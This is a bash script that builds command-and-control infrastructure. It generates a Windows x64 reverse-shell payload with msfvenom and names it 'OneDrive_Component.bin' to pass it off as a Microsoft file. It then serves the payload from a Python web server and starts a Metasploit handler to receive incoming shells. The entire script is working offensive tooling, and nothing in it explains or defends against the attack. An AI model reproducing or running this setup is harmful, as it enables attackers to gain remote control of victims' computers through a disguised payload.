#!/bin/bash

# --- SETUP
LHOST="192.168.122.235"     # Enter your Kali's IP here
LPORT="4444"                # everse Shell port
WEB_PORT="8080"             # Python Web Server port
PAYLOAD_NAME="OneDrive_Component.bin"
PAYLOAD_TYPE="windows/x64/shell_reverse_tcp"

# get script's absolute directory
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
WWW_DIR="$DIR/www"

# create www dir if not exist
mkdir -p "$WWW_DIR"

echo -e "\e[1;34m[*]=========================================\e[0m"
echo -e "\e[1;34m[*] Launching Automated C2 Infrastructure   \e[0m"
echo -e "\e[1;34m[*]=========================================\e[0m"

# 1. GENERATE PAYLOAD
echo -e "\e[1;33m[*] 1. Generating shellcode with msfvenom...\e[0m"
msfvenom -p $PAYLOAD_TYPE LHOST=$LHOST LPORT=$LPORT -f raw -o "$WWW_DIR/$PAYLOAD_NAME"
echo -e "\e[1;32m[+] Payload saved in: $WWW_DIR/$PAYLOAD_NAME\e[0m"

# 2. START PYTHON WEB SERVER
echo -e "\e[1;33m[*] 2. Starting Python Web Server on port $WEB_PORT...\e[0m"
cd "$WWW_DIR"
python3 -m http.server $WEB_PORT &
PYTHON_PID=$!  # save server PID
echo -e "\e[1;32m[+] Web Server listening on http://$LHOST:$WEB_PORT\e[0m"

# 3. START METASPLOIT LISTENER
echo -e "\e[1;33m[*] 3. Starting Metasploit Handler...\e[0m"
echo -e "\e[1;31m[!] Press Ctrl+C or write 'exit' in msfconsole to shut down the infrastructure.\e[0m"
cd "$DIR"

# start msfconsole in foreground
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE; set LHOST $LHOST; set LPORT $LPORT; exploit"

# CLEANUP
echo -e "\n\e[1;34m[*] Shutting down the infrastructure...\e[0m"
echo -e "\e[1;33m[*] Terminating Python Web Server (PID: $PYTHON_PID)...\e[0m"
kill $PYTHON_PID 2>/dev/null
echo -e "\e[1;32m[+] Operation completed. Goodbye!\e[0m"